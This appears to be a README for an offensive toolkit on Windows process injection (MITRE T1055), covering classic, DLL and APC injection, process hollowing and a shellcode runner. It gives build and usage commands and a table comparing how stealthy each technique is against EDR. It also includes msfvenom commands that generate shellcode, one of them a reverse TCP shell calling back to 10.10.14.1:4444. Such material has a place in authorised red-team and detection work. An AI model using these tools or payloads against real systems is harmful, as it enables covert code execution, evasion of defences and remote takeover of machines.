# Process Injection

Inject shellcode or DLLs into a running process to execute code in its context.

**MITRE ATT&CK**: T1055  
**Severity**: HIGH

## Files

| File | Technique | ATT&CK Sub |
|------|-----------|------------|
| [`classic_injection.c`](classic_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | T1055.003 |
| [`dll_injection.c`](dll_injection.c) | Write DLL path + `CreateRemoteThread` calling `LoadLibraryA` | T1055.001 |
| [`apc_injection.c`](apc_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `QueueUserAPC` | T1055.004 |
| [`process_hollowing.c`](process_hollowing.c) | CreateProcess SUSPENDED → NtUnmapViewOfSection → write PE → ResumeThread | T1055.012 |
| [`shellcode_runner.c`](shellcode_runner.c) | VirtualAlloc RWX → copy shellcode → execute (self-injection, file or embedded) | T1055 |

## Build

```bash
x86_64-w64-mingw32-gcc -o inject.exe classic_injection.c
x86_64-w64-mingw32-gcc -o dll_inject.exe dll_injection.c
x86_64-w64-mingw32-gcc -o apc_inject.exe apc_injection.c
```

## Usage

```bash
# Shellcode injection (embeds calc shellcode by default)
inject.exe <PID>
inject.exe notepad.exe

# DLL injection
dll_inject.exe <PID> C:\full\path\to\payload.dll

# APC injection (target must have alertable threads)
apc_inject.exe <PID>
```

## When to Use Each

| Technique | Pros | Cons |
|-----------|------|------|
| **Classic (CreateRemoteThread)** | Most reliable, works on most processes | Creates visible thread, detected by EDR |
| **DLL Injection** | Payload is a compiled DLL (easier to write complex payloads) | DLL on disk, LoadLibrary logged |
| **APC Injection** | Stealthier, no new thread | Only fires when target thread enters alertable wait |

## Customizing Shellcode

Replace the embedded shellcode in `classic_injection.c` or `apc_injection.c`:
```bash
# Generate with msfvenom
msfvenom -p windows/x64/exec CMD=calc.exe -f c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c
```
